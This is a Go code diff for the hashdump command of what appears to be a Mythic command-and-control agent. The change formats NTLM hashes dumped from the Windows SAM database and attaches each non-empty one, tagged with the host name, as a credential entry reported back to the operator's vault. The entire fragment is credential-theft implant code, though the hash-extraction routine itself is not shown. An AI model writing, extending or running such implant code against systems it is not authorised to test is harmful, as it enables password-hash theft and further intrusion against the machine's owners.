@@ -13,6 +13,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"os"
 	"strings"
 	"unicode/utf16"
 	"unsafe"
@@ -106,17 +107,34 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Format output
+	// Format output and build credential entries for Mythic's credential vault
+	hostname, _ := os.Hostname()
 	var sb strings.Builder
+	var creds []structs.MythicCredential
 	for _, u := range users {
 		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s:::\n", u.username, u.rid, u.lmHash, u.ntHash))
+
+		// Report NTLM hash to Mythic credential vault
+		if u.ntHash != emptyNTHash {
+			creds = append(creds, structs.MythicCredential{
+				CredentialType: "hash",
+				Realm:          hostname,
+				Account:        u.username,
+				Credential:     fmt.Sprintf("%s:%d:%s:%s:::", u.username, u.rid, u.lmHash, u.ntHash),
+				Comment:        "hashdump (SAM)",
+			})
+		}
 	}
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+	return result
 }
 
 type userHash struct {
